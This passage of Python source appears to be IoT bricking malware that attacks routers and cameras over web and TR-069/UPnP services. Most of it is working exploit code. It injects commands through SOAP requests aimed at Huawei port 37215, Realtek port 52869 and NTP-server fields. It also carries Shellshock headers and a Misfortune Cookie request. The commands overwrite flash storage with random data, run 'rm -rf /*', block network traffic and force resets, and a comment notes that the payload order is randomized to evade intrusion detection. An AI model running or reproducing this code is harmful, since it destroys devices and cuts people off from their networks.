				pwdbindex = -1
				for pi in range(len(pwdb)):
					if 'admin/' in pwdb[pi]:
						pwdbindex = pi
						break
					if '888888/' in pwdb[pi]:
						pwdbindex = pi
						break
				if pwdbindex < 0:
					# no admin or 888888 in userlist, make sure we avoid default if at all possible
					if 'default/' in pwdb[0] and len( pwdb ) > 1:
						pwdbindex = 1
					else:
						pwdbindex = 0
				webtask_customdata1[jobhash] = pwdb[pwdbindex].split('/')[0]
				webtask_customdata3[jobhash] = pwdb[pwdbindex].split('/')[1]
				webtask_customdata4[jobhash] = 'OldDigest'
				webtask_login[jobhash] = webtask_customdata1[jobhash]
				webtask_password[jobhash] = webtask_customdata3[jobhash]
				if len( webtask_customdata3[jobhash] ) == 32:
					setkeepalive = 1
					webtask_customdata4[jobhash] = 'Default'
			else:
				webtask_payloadindex[jobhash] = 99
			webtask_payloadindex[jobhash] += 1
		elif webtask_payloadindex[jobhash] == 1:
			# here we got to grab the session.. 
			matches = re.search( '"session"\s*:\s*(\d+)', webclient_response[webhash] )
			if matches:
				webtask_customdata2[jobhash] = matches.group(1)
				
				# check if hash is gen 3, look for random and recalc thing
				if len( webtask_customdata3[jobhash] ) == 32:
					matches = re.search( '"random"\s*:\s*"?(\d+)"?', webclient_response[webhash] )
					if matches:
						gen3str = webtask_login[jobhash] + ":" + matches.group(1) + ":" + webtask_customdata3[jobhash]
						gen3out = ''
	#					try:
						if 1:
							pipe = subprocess.Popen('echo -n '+gen3str+'|md5sum', shell=True, stdout=subprocess.PIPE)
							data = pipe.communicate()[0]
							matches = re.search( '([a-f0-9]{32})', data )
							if matches:
								webtask_customdata3[jobhash] = matches.group(1).upper()
								# HACK - flaky dahua requires us to feed the next command to the same
								# open socket - can't handle disconnection.. so let's fake state and keepalive
								webtask_payloadindex[jobhash] += 1
								webclient_connectiontime[webhash] = time.time()
								webclient_request[webhash] = webtask_payloadbuf[jobhash][webtask_payloadindex[jobhash]]
								webclient_push_request( sock, webhash, jobhash )
								return
								
	#					except:
	#						webtask_payloadindex[jobhash] = 99
				
			else:
				webtask_payloadindex[jobhash] = 99
			webtask_payloadindex[jobhash] += 1
		else:
			if webtask_keepalive[jobhash]:
				# handle keepalive
				webtask_payloadindex[jobhash] += 1
				if webtask_payloadindex[jobhash] >= len( webtask_payloadbuf[jobhash] ) - 1:
					# almost done with stuff - terminate conn in kludgy way
					webtask_keepalive[jobhash] = 0
					setkeepalive = 0
					try:
						sock.close()
					except:
						pass
				else:
					webclient_connectiontime[webhash] = time.time()
					webclient_request[webhash] = webtask_payloadbuf[jobhash][webtask_payloadindex[jobhash]]
					webclient_push_request( sock, webhash, jobhash )
					return
			else:
				webtask_payloadindex[jobhash] += 1
			

	if webtask_keepalive[jobhash]:
		# this is an error - untrapped keepalive got all the way here
		log_session( "NOTC: Untrapped keepalive" )
		try:
			sock.close()
		except:
			pass
	if setkeepalive:
		# we will keep this on perm for now
		webtask_keepalive[jobhash] = setkeepalive
		

	# set master structs in accordance
	# here allow for a custom next-attempt time (e.g. in case we have a nag screen)
	curtime = time.time()
	if webtask_nextconnectiontime[jobhash] <= curtime:
		webtask_nextconnectiontime[jobhash] = time.time() + webclient_waitbetweenattempts
	webtask_currentsock[jobhash] = None
  
	webclient_socks.remove(sock)
	webclient_ref[webhash] = None
	webclient_state[webhash] = None
	webclient_request[webhash] = None
	webclient_response[webhash] = None
	webclient_connectiontime[webhash] = None
	webclient_master[webhash] = None
	
def webtask_update():
	curtime = time.time()
	temptasks = webtask_jobs
	for task in temptasks:
		jobhash = hash(task)
		if webtask_currentsock[jobhash] == None:
			# Are we done?
			if webtask_payloadindex[jobhash] >= len( webtask_payloadbuf[jobhash] ):
				# yes - call it quits for this job
				webtask_close(jobhash)
				continue
		
			# time to create another socket?
			if curtime >= webtask_nextconnectiontime[jobhash]:
				# sure
				newsock = webclient_create( webtask_ref[jobhash][0], webtask_ref[jobhash][1], webtask_payloadbuf[jobhash][webtask_payloadindex[jobhash]], jobhash )
				webtask_currentsock[jobhash] = newsock
				webtask_nextconnectiontime[jobhash] = 0


def webclient_push_request( sock, webhash, jobhash ):

	tempoctet = random.uniform(30,254)
	tempoctwo = random.uniform(1,254)

	if '%' in webclient_request[webhash]:
		if '%%TARGETIP%%' in webclient_request[webhash]:
			webclient_request[webhash] = re.sub( '%%TARGETIP%%', webtask_ref[jobhash][0], webclient_request[webhash] )
		if '%%TARGETPORT%%' in webclient_request[webhash]:
			webclient_request[webhash] = re.sub( '%%TARGETPORT%%', '%d'%(webtask_ref[jobhash][1]), webclient_request[webhash] )
		if '%%LOGIN%%' in webclient_request[webhash]:
			webclient_request[webhash] = re.sub( '%%LOGIN%%', webtask_login[jobhash], webclient_request[webhash] )
		if '%%PASSWORD%%' in webclient_request[webhash]:
			webclient_request[webhash] = re.sub( '%%PASSWORD%%', webtask_password[jobhash], webclient_request[webhash] )
		if '%%NEWPASSWORD%%' in webclient_request[webhash]:
			webclient_request[webhash] = re.sub( '%%NEWPASSWORD%%', webtask_newpassword[jobhash], webclient_request[webhash] )
		if '%%CUSTOM1%%' in webclient_request[webhash]:
			webclient_request[webhash] = re.sub( '%%CUSTOM1%%', webtask_customdata1[jobhash], webclient_request[webhash] )
		if '%%CUSTOM2%%' in webclient_request[webhash]:
			webclient_request[webhash] = re.sub( '%%CUSTOM2%%', webtask_customdata2[jobhash], webclient_request[webhash] )
		if '%%CUSTOM3%%' in webclient_request[webhash]:
			webclient_request[webhash] = re.sub( '%%CUSTOM3%%', webtask_customdata3[jobhash], webclient_request[webhash] )
		if '%%CUSTOM4%%' in webclient_request[webhash]:
			webclient_request[webhash] = re.sub( '%%CUSTOM4%%', webtask_customdata4[jobhash], webclient_request[webhash] )
		if '%%RAND16%%' in webclient_request[webhash]:
			webclient_request[webhash] = re.sub( '%%RAND16%%', '%d.%d'%(tempoctet,random.uniform(20,200)), webclient_request[webhash] )
		if '%%COMP16%%' in webclient_request[webhash]:
			webclient_request[webhash] = re.sub( '%%COMP16%%', '%d.%d'%(tempoctet,random.uniform(201,253)), webclient_request[webhash] )
		if '%%RAND8%%' in webclient_request[webhash]:
			webclient_request[webhash] = re.sub( '%%RAND8%%', '%d.%d.%d'%(tempoctet,tempoctwo,random.uniform(20,200)), webclient_request[webhash] )
		if '%%COMP8%%' in webclient_request[webhash]:
			webclient_request[webhash] = re.sub( '%%COMP8%%', '%d.%d.%d'%(tempoctet,tempoctwo,random.uniform(201,253)), webclient_request[webhash] )
		if '%%RHEX1%%' in webclient_request[webhash]:
			webclient_request[webhash] = re.sub( '%%RHEX1%%', ''.join(random.choice('ABCDEF0123456789') for i in range(2)), webclient_request[webhash] )
		if '%%RHEX2%%' in webclient_request[webhash]:
			webclient_request[webhash] = re.sub( '%%RHEX2%%', ''.join(random.choice('ABCDEF0123456789') for i in range(2)), webclient_request[webhash] )
		if '%%RHEX3%%' in webclient_request[webhash]:
			webclient_request[webhash] = re.sub( '%%RHEX3%%', ''.join(random.choice('ABCDEF0123456789') for i in range(2)), webclient_request[webhash] )
		if '%%RANDPORT%%' in webclient_request[webhash]:
			webclient_request[webhash] = re.sub( '%%RANDPORT%%', '%d'%(random.uniform(10000,65000)), webclient_request[webhash] )
		# do body length calc last in case some other tag changes body
		if '%%BODYLENGTH%%' in webclient_request[webhash]:
			headerendindex = webclient_request[webhash].find('\r\n\r\n')
			contentlength = -1
			if headerendindex >= 0:
				headerendindex += 4
			else:
				headerendindex = webclient_request[webhash].find('\n\n')
				if headerendindex >= 0:
					headerendindex += 2
					
			if headerendindex >= 0:
				# should really be more than 0 to be a valid HTTP reply!
				contentlength = (len(webclient_request[webhash])-headerendindex)
	
			webclient_request[webhash] = re.sub( '%%BODYLENGTH%%', '%d'%(contentlength), webclient_request[webhash] )
	try:
		sock.send( webclient_request[webhash] )
	except:
		pass
		
	return 1
				
def webclient_update():
	global webclient_maxconnectiontime_clientrequest
	global webclient_maxconnectiontime_payload
	
	curtime = time.time()

	# process sockets
	socktimeout = 0.01
	readable, writable, errored = select.select(webclient_socks, webclient_socks, [], socktimeout)
	for sock in webclient_socks:
		webhash = hash(sock)
		sockopt = sock.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
		if sockopt != 0:
			if webclient_response[webhash] == '':
				webclient_response[webhash] = '(timeout)';
			webclient_close( sock )
			continue
		if sock in readable:
			data = ''
			try:
				data = sock.recv(2048)
			except:
				pass
			if data:
				webclient_response[webhash] += data
				headerendindex = webclient_response[webhash].find('\r\n\r\n')
				if headerendindex >= 0:
					headerendindex += 4
				else:
					headerendindex = webclient_response[webhash].find('\n\n')
					if headerendindex >= 0:
						headerendindex += 2
					
				if headerendindex >= 0:
					# should really be more than 0 to be a valid HTTP reply!
					matches = re.search('Content-Length:\s*(\d+)', webclient_response[webhash])
					if matches:
						contentlength = int(matches.group(1))
						if len(webclient_response[webhash])-headerendindex == contentlength:
							# won't get any more data, just close socket
							webclient_close(sock)
							continue
				
			else:
				webclient_close(sock)
				continue
		if sock in writable:
			if webclient_state[webhash] == 0:
				# expecting request
				jobhash = webclient_master[webhash] 
				webclient_push_request( sock, webhash, jobhash )
				webclient_state[webhash] = 1
				
		timetarget = webclient_maxconnectiontime_clientrequest
		jobhash = webclient_master[webhash] 
		if webtask_keepalive[jobhash]:
			# here we need quicker reactions - TODO: should really just look at expected bytes
			# and immediately call close when we have everything we expected when keepalive - HACK
			timetarget = 15
		if curtime - webclient_connectiontime[webhash] > timetarget:
			# tweak - indicate timeout if we didn't get anything
			if webclient_response[webhash] == '':
				webclient_response[webhash] = '(timeout)';
			webclient_close(sock)
			continue
	
################################# web payload module end #####################################

# just to keep flakier devices from rebooting while parsing this					
time.sleep(3)

################################## tr69 payload module #######################################



tr69client_maxconnectiontime_clientrequest = 20
tr69client_waitbetweenattempts = 7




# task-specific structs
tr69client_socks = []
tr69client_ref = {}
tr69client_master = {}
tr69client_response = {}
tr69client_state = {}
tr69client_request = {}
tr69client_connectiontime = {}
# here are the main structs keeping track of the overall job
tr69task_jobs = []
tr69task_ref = {}
tr69task_payloadindex = {}
tr69task_lastresponse = {}
tr69task_nextconnectiontime = {}
tr69task_currentsock = {}



tr069header = 'POST /UD/act?1 HTTP/1.1\r\nHost: 127.0.0.1:%d\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nSOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers\r\nContent-Type: text/xml\r\nContent-Length: %d\r\n\r\n'
tr069bodyfirst = '<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1"><NewNTPServer1>`'
tr069bodylastA = '`</NewNTPServer1><NewNTPServer2></NewNTPServer2><NewNTPServer3></NewNTPServer3><NewNTPServer4></NewNTPServer4><NewNTPServer5></NewNTPServer5></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>'
tr069bodylastB = '`</NewNTPServer1><NewNTPServer2>`route del default`</NewNTPServer2><NewNTPServer3>`iptables -A OUTPUT -j DROP`</NewNTPServer3><NewNTPServer4></NewNTPServer4><NewNTPServer5></NewNTPServer5></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>'

#NOTENOTENOTE if you modify payloads check the 'roulette' var further down
tr069payloads = [
	'busybox cat /dev/urandom >/dev/mtdblock0;busybox cat /dev/urandom >/dev/mtdblock1;busybox cat /dev/urandom >/dev/mtdblock2;busybox cat /dev/urandom >/dev/mtdblock3;busybox cat /dev/urandom >/dev/mtdblock4;busybox cat /dev/urandom >/dev/mtdblock5',
	'busybox cat /dev/urandom >/dev/mtdblock0;busybox cat /dev/urandom >/dev/mtdblock1;busybox cat /dev/urandom >/dev/mtdblock2;busybox cat /dev/urandom >/dev/mtdblock3;busybox cat /dev/urandom >/dev/mtdblock4;busybox cat /dev/urandom >/dev/mtdblock5 &',
	'cat /dev/urandom >/dev/mtdblock0;cat /dev/urandom >/dev/mtdblock1;cat /dev/urandom >/dev/mtdblock2;cat /dev/urandom >/dev/mtdblock3;cat /dev/urandom >/dev/mtdblock4;cat /dev/urandom >/dev/mtdblock5',
	'cat /dev/urandom >/dev/mtdblock0;cat /dev/urandom >/dev/mtdblock1;cat /dev/urandom >/dev/mtdblock2;cat /dev/urandom >/dev/mtdblock3;cat /dev/urandom >/dev/mtdblock4;cat /dev/urandom >/dev/mtdblock5 &',
	'cat /dev/urandom >/dev/root',
	'dd if=/dev/urandom of=/dev/root',
	'busybox cat /dev/urandom >/dev/root',
	# shellshock brick attempts
	'GET / HTTP/1.0\r\nUser-Agent: () { :;};cat /dev/urandom >/dev/root\r\nConnection: close\r\n\r\n',
	'GET / HTTP/1.0\r\nUser-Agent: () { :;};dd if=/dev/urandom of=/dev/root\r\nConnection: close\r\n\r\n',
	# hack - some plan b options we'll handle at generation time
  'POST /UD/act/?1 HTTP/1.1\r\nHost: 127.0.0.1:7547\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nSOAPAction: urn:dslforum-org:service:WANEthernetInterfaceConfig:1#SetEnable\r\nContent-Type: text/xml\r\nContent-Length: 336\r\n\r\n<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> <SOAP-ENV:Body>  <u:SetEnable xmlns:u="urn:dslforum-org:service:WANEthernetInterfaceConfig:1"><NewEnable>0</NewEnable></u:SetEnable> </SOAP-ENV:Body></SOAP-ENV:Envelope>',
  'POST /UD/act/?1 HTTP/1.1\r\nHost: 127.0.0.1:7547\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nSOAPAction: urn:dslforum-org:service:WANPPPConnection:1#SetEnable\r\nContent-Type: text/xml\r\nContent-Length: 326\r\n\r\n<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> <SOAP-ENV:Body>  <u:SetEnable xmlns:u="urn:dslforum-org:service:WANPPPConnection:1"><NewEnable>0</NewEnable></u:SetEnable> </SOAP-ENV:Body></SOAP-ENV:Envelope>',
  'POST /UD/act/?1 HTTP/1.1\r\nHost: 127.0.0.1:7547\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nSOAPAction: urn:dslforum-org:service:WANIPConnection:1#SetEnable\r\nContent-Type: text/xml\r\nContent-Length: 325\r\n\r\n<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> <SOAP-ENV:Body>  <u:SetEnable xmlns:u="urn:dslforum-org:service:WANIPConnection:1"><NewEnable>0</NewEnable></u:SetEnable> </SOAP-ENV:Body></SOAP-ENV:Envelope>',
	# just try to temp disconnect until reboot
	'route del default;iproute del default;ip route del default;iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP;rm -rf /*',
	'ifconfig eth0 down;ifconfig wlan0 down',
	'iptables -A OUTPUT -j DROP',
	'route del default',
	'poweroff',
	'rm -rf /*',
  'POST /UD/act/?1 HTTP/1.1\r\nHost: 127.0.0.1:7547\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nSOAPAction: urn:dslforum-org:service:DeviceConfig:1#FactoryReset\r\nContent-Type: text/xml\r\nContent-Length: 304\r\n\r\n<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> <SOAP-ENV:Body>  <u:FactoryReset xmlns:u="urn:dslforum-org:service:DeviceConfig:1"></u:FactoryReset> </SOAP-ENV:Body></SOAP-ENV:Envelope>',
  # try misfortune cookie crash and a few spare requests
  'GET / HTTP/1.0\r\nCookie: C\r\n\r\n',
  # shellshock for good measure
  'GET / HTTP/1.0\r\nUser-Agent: () { :;};route del default;ip route del default;iproute del default;rm -rf *;rm -rf /*\r\n\r\n',
	'reboot',
  'POST /UD/act/?1 HTTP/1.1\r\nHost: 127.0.0.1:7547\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nSOAPAction: urn:dslforum-org:service:DeviceConfig:1#Reboot\r\nContent-Type: text/xml\r\nContent-Length: 292\r\n\r\n<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> <SOAP-ENV:Body>  <u:Reboot xmlns:u="urn:dslforum-org:service:DeviceConfig:1"></u:Reboot> </SOAP-ENV:Body></SOAP-ENV:Envelope>',
]

huaweipayload = 'POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: %%TARGETIP%%:37215\r\nContent-Length: 601\r\nConnection: keep-alive\r\nAuthorization: Digest username="dslf-config", realm="HuaweiHomeGateway", nonce="88645cefb1f9ede0e336e3569d75ee30", uri="/ctrlt/DeviceUpgrade_1", response="3612f843a42db38f48f59d2a3597e19c", algorithm="MD5", qop="auth", nc=00000001, cnonce="248d1a2560100669"\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>$(/bin/busybox cat /dev/urandom >/dev/mtdblock0;/bin/busybox cat /dev/urandom >/dev/mtdblock3;/bin/busybox cat /dev/urandom >/dev/mtdblock1;/bin/busybox cat /dev/urandom >/dev/mtdblock2;/bin/busybox cat /dev/urandom >/dev/mtdblock4;/bin/iptables -A OUTPUT -j DROP)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>'

realtekpayloads = [
  'POST /picdesc.xml HTTP/1.1\r\nHost: %%TARGETIP%%:52869\r\nContent-Length: 866\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>%%RAND16A%%</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>%%RAND16B%%</NewInternalPort><NewInternalClient>`busybox cat /dev/urandom >/dev/mtdblock0;busybox cat /dev/urandom >/dev/mtdblock1;busybox cat /dev/urandom >/dev/mtdblock2;busybox cat /dev/urandom >/dev/mtdblock3;busybox cat /dev/urandom >/dev/mtdblock4;busybox cat /dev/urandom >/dev/mtdblock5;busybox cat /dev/urandom >/dev/mtdblock6`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>',
  'POST /picdesc.xml HTTP/1.1\r\nHost: %%TARGETIP%%:52869\r\nContent-Length: 873\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>%%RAND16A%%</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>%%RAND16B%%</NewInternalPort><NewInternalClient>`busybox cat /dev/urandom >/dev/mtdblock/0;busybox cat /dev/urandom >/dev/mtdblock/1;busybox cat /dev/urandom >/dev/mtdblock/2;busybox cat /dev/urandom >/dev/mtdblock/3;busybox cat /dev/urandom >/dev/mtdblock/4;busybox cat /dev/urandom >/dev/mtdblock/5;busybox cat /dev/urandom >/dev/mtdblock/6`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>',
  'POST /picdesc.xml HTTP/1.1\r\nHost: %%TARGETIP%%:52869\r\nContent-Length: 615\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>%%RAND16A%%</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>%%RAND16B%%</NewInternalPort><NewInternalClient>`busybox cat /dev/urandom >/dev/root`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>',
  'POST /picdesc.xml HTTP/1.1\r\nHost: %%TARGETIP%%:52869\r\nContent-Length: 612\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>%%RAND16A%%</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>%%RAND16B%%</NewInternalPort><NewInternalClient>`cat /dev/urandom >/dev/mtdblock0`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>',
  'POST /picdesc.xml HTTP/1.1\r\nHost: %%TARGETIP%%:52869\r\nContent-Length: 612\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>%%RAND16A%%</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>%%RAND16B%%</NewInternalPort><NewInternalClient>`cat /dev/urandom >/dev/mtdblock1`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>',
  'POST /picdesc.xml HTTP/1.1\r\nHost: %%TARGETIP%%:52869\r\nContent-Length: 612\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>%%RAND16A%%</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>%%RAND16B%%</NewInternalPort><NewInternalClient>`cat /dev/urandom >/dev/mtdblock2`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>',
  'POST /picdesc.xml HTTP/1.1\r\nHost: %%TARGETIP%%:52869\r\nContent-Length: 612\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>%%RAND16A%%</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>%%RAND16B%%</NewInternalPort><NewInternalClient>`cat /dev/urandom >/dev/mtdblock3`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>',
  'POST /picdesc.xml HTTP/1.1\r\nHost: %%TARGETIP%%:52869\r\nContent-Length: 798\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>%%RAND16A%%</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>%%RAND16B%%</NewInternalPort><NewInternalClient>`busybox cat /dev/urandom >/dev/root;route del default;iptables -A OUTPUT -j DROP;busybox route del default;/bin/route del default;/sbin/route del default;/sbin/iptables -A OUTPUT -j DROP;/bin/iptables -A OUTPUT -j DROP`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>',
  'POST /picdesc.xml HTTP/1.1\r\nHost: %%TARGETIP%%:52869\r\nContent-Length: 586\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>%%RAND16A%%</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>%%RAND16B%%</NewInternalPort><NewInternalClient>`reboot`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>',
]


def generate_tr069_payload( targetport, index ):
	global tr069bodyfirst
	global tr069payloads
	global tr069bodylastA
	global tr069bodylastB
	global tr069header
	global huaweipayload

	if targetport == 37215:
		return huaweipayload
		
	if targetport == 52869:
		return realtekpayloads[index % 9]

	if 'POST /UD/act/' in tr069payloads[index] or 'GET / HTTP' in tr069payloads[index]:
		return tr069payloads[index];	
	else:
		body = tr069bodyfirst;
		body += tr069payloads[index]
		if index < 5 or random.randint( 0, 99 ) < 30:
			body += tr069bodylastA
		else:
			body += tr069bodylastB
		header = tr069header % ( targetport, len(body) )
		return header + body


def tr69task_create( targetip, targetport ):
	global execWP
	
	if not execWP:
		return

	brutetuple = ( targetip, int(targetport ) )
	webhash = hash( brutetuple )
	if webhash in tr69task_jobs:
		return;

	tr69task_payloadindex[webhash] = 0
	# hack - to get around IDS etc stuff we will randomize the starting index a bit.. 
	roulette = random.randint( 0, 99 )
	if roulette < 20:
		tr69task_payloadindex[webhash] = 9
	elif roulette < 40:
		tr69task_payloadindex[webhash] = 5
	elif roulette < 60:
		tr69task_payloadindex[webhash] = 18
	if int(targetport) == 52869:
		tr69task_payloadindex[webhash] = 0
	tr69task_ref[webhash] = ( targetip, int(targetport) )
	tr69task_nextconnectiontime[webhash] = 0
	tr69task_currentsock[webhash] = None
	tr69task_jobs.append(webhash)

def tr69client_create( targetip, targetport, request, jobhash ):
	brutetuple = ( targetip, int(targetport ) )
	newsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	newsock.setblocking(0)
	
	try:
		newsock.connect(brutetuple)
	except:
		pass
	
	if '%' in request:
		if '%%TARGETIP%%' in request:
			request = re.sub( '%%TARGETIP%%', targetip, request )
		if '%%RAND16A%%' in request:
			request = re.sub( '%%RAND16A%%', '%d' % ( random.uniform(10000,65535) ), request )
		if '%%RAND16B%%' in request:
			request = re.sub( '%%RAND16B%%', '%d' % ( random.uniform(10000,65535) ), request )
	
	webhash = hash( newsock )
	tr69client_socks.append(newsock)
	tr69client_ref[webhash] = ( targetip, int(targetport), request )
	tr69client_state[webhash] = 0
	tr69client_request[webhash] = request
	tr69client_response[webhash] = ''
	tr69client_connectiontime[webhash] = time.time()
	tr69client_master[webhash] = jobhash
	tr69task_currentsock[jobhash] = newsock
	tr69task_lastresponse[jobhash] = ''
	return newsock

def tr69task_close( webhash ):
	global showWP
	
	if showWP:
